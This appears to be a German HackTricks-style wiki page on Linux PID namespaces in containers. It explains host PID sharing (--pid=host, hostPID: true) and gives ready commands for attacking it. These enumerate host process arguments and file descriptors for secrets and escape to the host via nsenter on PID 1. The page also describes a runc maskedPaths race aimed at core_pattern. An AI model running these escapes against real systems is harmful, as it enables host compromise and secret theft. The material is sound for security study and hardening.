# PID-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Übersicht

Der PID-Namespace steuert, wie Prozesse nummeriert werden und welche Prozesse sichtbar sind. Deshalb kann ein Container seine eigene PID 1 haben, obwohl es sich nicht um eine echte Maschine handelt. Innerhalb des Namespace sieht der Workload einen scheinbar lokalen Prozessbaum. Außerhalb des Namespace sieht der Host weiterhin die echten Host-PIDs und die vollständige Prozesslandschaft.

Aus Sicherheitssicht ist der PID-Namespace wichtig, weil Prozesssichtbarkeit wertvoll ist. Sobald ein Workload Host-Prozesse sehen kann, kann er Dienstnamen, Kommandozeilenargumente, in Prozessargumenten übergebene Geheimnisse, über `/proc` abgeleitete Umgebungszustände und potenzielle Ziele zum Einsteigen in Namespaces beobachten. Wenn er mehr als nur diese Prozesse sehen kann — zum Beispiel Signale senden oder ptrace unter den richtigen Bedingungen verwenden — wird das Problem deutlich ernster.

## Funktionsweise

Ein neuer PID-Namespace beginnt mit eigener interner Prozessnummerierung. Der erste darin erzeugte Prozess wird aus Sicht des Namespace zur PID 1, was auch bedeutet, dass er eine spezielle init-ähnliche Semantik für verwaiste Kinder und das Signalverhalten erhält. Das erklärt viele Container-Eigenheiten rund um init-Prozesse, das Aufräumen von Zombies und warum in Containern manchmal kleine init-Wrapper verwendet werden.

Die wichtige Sicherheitslehre ist, dass ein Prozess isoliert erscheinen kann, weil er nur seinen eigenen PID-Baum sieht, diese Isolation jedoch absichtlich aufgehoben werden kann. Docker ermöglicht dies über `--pid=host`, Kubernetes über `hostPID: true`. Sobald der Container dem Host-PID-Namespace beitritt, sieht der Workload die Host-Prozesse direkt, und viele spätere Angriffswege werden deutlich realistischer.

## Labor

Um einen PID-Namespace manuell zu erstellen:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die Shell sieht jetzt eine private Prozessansicht. Das Flag `--mount-proc` ist wichtig, weil es eine procfs-Instanz mountet, die zur neuen PID namespace passt und die Prozessliste von innen kohärent macht.

Zum Vergleich des Verhaltens des Containers:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Der Unterschied ist sofort ersichtlich und leicht nachzuvollziehen, weshalb dies ein gutes erstes Labor für Leser ist.

## Zur Laufzeit

Normale Container in Docker, Podman, containerd und CRI-O erhalten ihre eigene PID-Namespace. Kubernetes-Pods bekommen normalerweise ebenfalls eine isolierte PID-Ansicht, sofern die Workload nicht explizit Host-PID-Sharing verlangt. LXC/Incus-Umgebungen nutzen dasselbe Kernel-Primitiv, obwohl System-Container-Einsatzfälle komplexere Prozessbäume offenbaren und eher zu Debugging-Abkürzungen verleiten können.

Die gleiche Regel gilt überall: wenn die Runtime sich entscheidet, die PID-Namespace nicht zu isolieren, ist das eine bewusste Verringerung der Container-Grenze.

## Fehlkonfigurationen

Die klassische Fehlkonfiguration ist Host-PID-Sharing. Teams rechtfertigen das oft mit Debugging-, Monitoring- oder Service-Management-Komfort, aber es sollte stets als bedeutsame Sicherheitsausnahme behandelt werden. Selbst wenn der Container keine unmittelbaren Schreibrechte über Host-Prozesse hat, kann allein die Sichtbarkeit vieles über das System offenbaren. Sobald Fähigkeiten wie `CAP_SYS_PTRACE` oder nützlicher procfs-Zugriff hinzukommen, vergrößert sich das Risiko erheblich.

Ein weiterer Fehler ist die Annahme, dass Host-PID-Sharing harmlos sei, nur weil die Workload standardmäßig Host-Prozesse nicht töten oder ptrace-en kann. Diese Schlussfolgerung ignoriert den Wert der Enumeration, die Verfügbarkeit von Zielen zum Betreten von Namespaces und die Art, wie sich PID-Sichtbarkeit mit anderen geschwächten Kontrollen kombiniert.

## Missbrauch

Wenn die Host-PID-Namespace geteilt wird, kann ein Angreifer Host-Prozesse inspizieren, Prozessargumente auslesen, interessante Services identifizieren, Kandidaten-PIDs für `nsenter` lokalisieren oder Prozesssichtbarkeit mit ptrace-bezogenen Privilegien kombinieren, um Host- oder benachbarte Workloads zu stören. In einigen Fällen reicht es, einfach den richtigen langlaufenden Prozess zu sehen, um den Rest des Angriffsplans neu zu gestalten.

Der erste praktische Schritt ist immer zu bestätigen, dass Host-Prozesse wirklich sichtbar sind:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sobald Host-PIDs sichtbar sind, werden Prozessargumente und Namespace-Eintrittsziele oft zur nützlichsten Informationsquelle:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Wenn `nsenter` verfügbar ist und genügend Privilegien bestehen, testen Sie, ob ein sichtbarer Host-Prozess als Namespace-Bridge verwendet werden kann:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selbst wenn ein Einstieg blockiert ist, ist das Teilen der Host-PIDs bereits wertvoll, da es die Service-Struktur, Laufzeitkomponenten und potenziell privilegierten Prozesse offenbart, die als Nächstes anvisiert werden können.

Die Sichtbarkeit der Host-PIDs macht zudem Missbrauch von Dateideskriptoren realistischer. Wenn ein privilegierter Host-Prozess oder eine benachbarte Workload eine sensitive Datei oder ein Socket geöffnet hat, kann der Angreifer möglicherweise `/proc/<pid>/fd/` einsehen und diesen Handle wiederverwenden — abhängig von Besitzrechten, procfs-Mount-Optionen und dem Service-Modell des Ziels.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Diese Befehle sind nützlich, weil sie beantworten, ob `hidepid=1` oder `hidepid=2` die prozessübergreifende Sichtbarkeit reduzieren und ob offensichtlich interessante Deskriptoren wie geöffnete geheime Dateien, Logs oder Unix sockets überhaupt sichtbar sind.

### Vollständiges Beispiel: host PID + `nsenter`

Host PID sharing wird zu einem direkten host escape, wenn der Prozess außerdem genügend Privilegien hat, um den Host-Namespaces beizutreten:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Wenn der Befehl erfolgreich ist, läuft der Containerprozess nun in den Host mount-, UTS-, network-, IPC- und PID-Namespaces. Die Auswirkung ist eine sofortige Kompromittierung des Hosts.

Selbst wenn `nsenter` selbst fehlt, lässt sich dasselbe Ergebnis möglicherweise über die Host-Binary erreichen, wenn das Host-Dateisystem gemountet ist:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Aktuelle Laufzeit-Hinweise

Einige für PID-Namespaces relevante Angriffe sind nicht traditionelle `hostPID: true`-Fehlkonfigurationen, sondern Laufzeit-Implementierungsfehler bei der Anwendung von procfs-Schutzmaßnahmen während der Container-Einrichtung.

#### `maskedPaths`-Race zum host procfs

In verwundbaren `runc`-Versionen konnten Angreifer, die das Container-Image oder die `runc exec`-Workload kontrollierten, die Maskierungsphase durch ein Race ausnutzen, indem sie die containerseitige `/dev/null` durch einen Symlink auf einen sensiblen procfs-Pfad wie `/proc/sys/kernel/core_pattern` ersetzten. Wenn das Race erfolgreich war, konnte der masked-path Bind-Mount auf dem falschen Ziel landen und host-globale procfs-Knobs dem neuen Container zugänglich machen.

Nützlicher Befehl zur Überprüfung:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Das ist wichtig, weil die letztendliche Auswirkung dieselbe wie bei einer direkten procfs-Exposition sein kann: beschreibbares `core_pattern` oder `sysrq-trigger`, gefolgt von Codeausführung auf dem Host oder Dienstverweigerung (Denial-of-Service).

#### Namespace injection mit `insject`

Namespace injection-Tools wie `insject` zeigen, dass die Interaktion mit dem PID-Namespace nicht immer erfordert, vor der Prozess-Erstellung in das Zielnamespace einzutreten. Ein Helfer kann sich später anhängen, `setns()` verwenden und ausführen, während die Sichtbarkeit in den Ziel-PID-Space erhalten bleibt:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Diese Art von Technik ist hauptsächlich relevant für fortgeschrittenes Debugging, offensive Tools und Post-Exploitation-Workflows, bei denen der Namespace-Kontext nachträglich betreten werden muss, nachdem die Runtime den Workload bereits initialisiert hat.

### Verwandte FD-Missbrauchsmuster

Zwei Muster sind besonders zu beachten, wenn host PIDs sichtbar sind. Erstens kann ein privilegierter Prozess einen sensiblen Datei-Deskriptor über `execve()` hinweg offen halten, weil er nicht mit `O_CLOEXEC` markiert wurde. Zweitens können Dienste Datei-Deskriptoren über Unix sockets mittels `SCM_RIGHTS` weiterreichen. In beiden Fällen ist das interessante Objekt nicht mehr der Pfadname, sondern der bereits geöffnete Handle, den ein weniger privilegierter Prozess erben oder erhalten kann.

Das ist bei Container-Arbeiten relevant, weil der Handle auf `docker.sock`, ein privilegiertes Log, eine geheime Datei des Hosts oder ein anderes hochpreisiges Objekt zeigen kann, selbst wenn der Pfad selbst vom Container-Dateisystem aus nicht direkt erreichbar ist.

## Checks

Der Zweck dieser Befehle ist zu ermitteln, ob der Prozess eine private PID-Ansicht hat oder ob er bereits eine deutlich breitere Prozesslandschaft auflisten kann.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Was hier interessant ist:

- Wenn die Prozessliste offensichtliche Host-Services enthält, ist host PID sharing wahrscheinlich bereits aktiv.
- Normalerweise sieht man nur einen kleinen container-internen Prozessbaum; `systemd`, `dockerd` oder nicht verwandte Daemons zu sehen, ist das nicht.
- Sobald host PIDs sichtbar sind, werden selbst schreibgeschützte Prozessinformationen zu nützlicher Aufklärung.

Wenn Sie entdecken, dass ein Container mit host PID sharing läuft, behandeln Sie es nicht als kosmetischen Unterschied. Es ist eine wesentliche Änderung dessen, was die Workload beobachten und potenziell beeinflussen kann.
